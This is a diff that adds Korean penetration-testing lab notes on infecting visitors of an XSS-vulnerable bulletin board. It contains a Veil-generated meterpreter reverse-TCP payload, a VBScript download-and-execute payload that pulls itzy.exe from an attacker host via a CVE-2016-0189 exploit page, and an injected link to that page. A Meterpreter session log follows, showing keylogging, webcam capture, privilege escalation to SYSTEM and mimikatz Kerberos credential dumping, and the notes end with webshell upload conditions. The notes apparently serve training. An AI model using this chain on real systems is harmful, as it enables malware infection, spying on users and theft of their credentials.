@@ -1,0 +1,200 @@
+#모의해킹 사이트
+#유선랜: http://10.10.0.153/
+#무선랜: http://61.39.155.24:50003/
+
+#공유서버
+#http://192.168.100.30/
+
+#XSS 취약점이 존재하는 웹 사이트에 접속자 PC를 대상으로 악성코드 감염 공격
+1. 악성코드 감염경로
+ 1) XSS 취약점이 존재하는 사이트
+ 2) 게시판의 악성스크립트를 이용
+
+2. 환경구성
+ 1) 공격자
+  = KALI Linux
+   - Exploit Page(+Payload) 구성: CVE-2016-0189
+   - (윈도우기반) 악성코드 제작: Veil-Framework
+
+ 2) 피해자
+  = Windows PC
+   - Internet Explorer 11 Vulnerability: CVE-2016-0189(vbscript memory corruption bug)
+
+3. Veil-Framework의 Evasion 기능을 활용한 윈도우 기반 악성코드 제작하기
+root@kali:~# cd ~
+root@kali:~# cd Veil/
+root@kali:~/Veil# python3 Veil.py
+
+Available Tools:
+
+	1)	Evasion
+	2)	Ordnance
+
+Veil>: use 1
+Veil/Evasion>: list
+
+28)	python/meterpreter/rev_tcp.py
+
+Veil/Evasion>: use 28
+
+Required Options:
+
+Name            	Value   	Description
+----            	-----   	-----------
+LHOST           	        	The listen target address
+LPORT           	4444    	The listen port
+
+[python/meterpreter/rev_tcp>>]: set LHOST [공격자IP]
+[python/meterpreter/rev_tcp>>]: set LHOST 192.168.0.130
+[python/meterpreter/rev_tcp>>]: generate
+[>] Please enter the base name for output files (default is payload): itzy
+
+ [*] Language: python
+ [*] Payload Module: python/meterpreter/rev_tcp
+ [*] Executable written to: /var/lib/veil/output/compiled/itzy.exe
+ [*] Source code written to: /var/lib/veil/output/source/itzy.py
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/itzy.rc
+
+root@kali:~/Veil# cp /var/lib/veil/output/compiled/itzy.exe /var/www/html
+root@kali:~/Veil# service apache2 restart
+root@kali:~/Veil# msfconsole -r /var/lib/veil/output/handlers/itzy.rc
+
+vbscript_godmode.html
+payload: excute "cmd" -> vbscript: 악성파일요청 - 요청한악성파일저장 -저장한악성파일실행
+
+set shell=createobject("Shell.Application")  
+shell.ShellExecute "cmd.exe", "/c CD %TEMP%&@echo Set objXMLHTTP=CreateObject(""MSXML2.XMLHTTP"")>down_exec.vbs&@echo objXMLHTTP.open ""GET"",""http://192.168.0.130/itzy.exe"",false>>down_exec.vbs&@echo objXMLHTTP.send()>>down_exec.vbs&@echo If objXMLHTTP.Status=200 Then>>down_exec.vbs&@echo Set objADOStream=CreateObject(""ADODB.Stream"")>>down_exec.vbs&@echo objADOStream.Open>>down_exec.vbs&@echo objADOStream.Type=1 >>down_exec.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>down_exec.vbs&@echo objADOStream.Position=0 >>down_exec.vbs&@echo objADOStream.SaveToFile ""%TEMP%\itzy.exe"">>down_exec.vbs&@echo objADOStream.Close>>down_exec.vbs&@echo Set objADOStream=Nothing>>down_exec.vbs&@echo End if>>down_exec.vbs&@echo Set objXMLHTTP=Nothing>>down_exec.vbs&@echo Set objShell=CreateObject(""WScript.Shell"")>>down_exec.vbs&@echo objShell.Exec(""%TEMP%\itzy.exe"")>>down_exec.vbs&cscript.exe %TEMP%\down_exec.vbs&del %TEMP%\down_exec.vbs", "", "open", 0
+
+4. XSS 취약점 게시판에 vbscript_godmode.html 호출하는 악성스크립트 구문 삽입
+<a href="http://192.168.0.130/vbscript_godmode.html">클릭하세요</a>
+
+5. Metasploit Meterpreter를 이용한 피해자 PC 정보수집
+[*] Meterpreter session 1 opened
+msf5 exploit(multi/handler) > sessions
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                Connection
+  --  ----  ----                     -----------                                ----------
+  1         meterpreter x86/windows  MSDN-SPECIAL\Administrator @ MSDN-SPECIAL
+
+msf5 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter >?
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    migrate                  Migrate the server to another process
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    upload        Upload a file or directory
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    getuid        Get the user that the server is running as
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    screenshot     Grab a screenshot of the interactive desktop
+
+meterpreter > ps -S explorer.exe
+Filtering on 'explorer.exe'
+
+Process List
+============
+
+ PID   PPID  Name          Arch  Session  User                        Path
+ ---   ----  ----          ----  -------  ----                        ----
+ 2504  1164  explorer.exe  x64   2        MSDN-SPECIAL\Administrator  C:\Windows\explorer.exe
+
+meterpreter > migrate 2504
+[*] Migrating from 2308 to 2504...
+[*] Migration completed successfully.
+
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > keyscan_dump
+meterpreter > upload /var/www/html/messbox1.exe c:\
+meterpreter > shell
+C:\>exit
+exit
+meterpreter >screenshot
+meterpreter > webcam_snap
+meterpreter > run vnc
+meterpreter > getuid
+meterpreter > ps -S svchost.exe
+Filtering on 'svchost.exe'
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User                          Path
+ ---   ----  ----         ----  -------  ----                          ----
+ 632   512   svchost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+
+meterpreter > migrate 632
+[*] Migrating from 2504 to 632...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > load mimikatz
+meterpreter >?
+Mimikatz Commands
+=================
+
+    Command           Description
+    -------           -----------
+    kerberos          Attempt to retrieve kerberos creds.
+
+meterpreter >kerberos
+
+#파일업로드
+1. 악성 프로그램 업로드 조건
+ 1) 업로드 기능 애플리케이션 찾아보기
+  = 게시판의 첨부기능
+  = 게시판의 Editor 취약점
+   - fckeditor
+   - smarteditor
+  = 주석처리된 첨부기능
+
+ 2) 업로드 한 파일이 서버에 업로드 되었을 때 확장자가 ASP, PHP, JSP 등으로 저장되어야만 URL을 통한 실행이 가능함
+ 3) 개발 운영 환경과 동일한 언어로 작성된 악성파일을 업로드 해야 함
+  * LAB: http://www.igloosec.co.kr/BLOG_Webshell%20%EB%B6%84%EB%A5%98%20%EB%B0%8F%20%EB%8C%80%EC%9D%91%EB%B0%A9%EC%95%88?searchItem=&searchWord=&bbsCateId=47&gotoPage=3
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
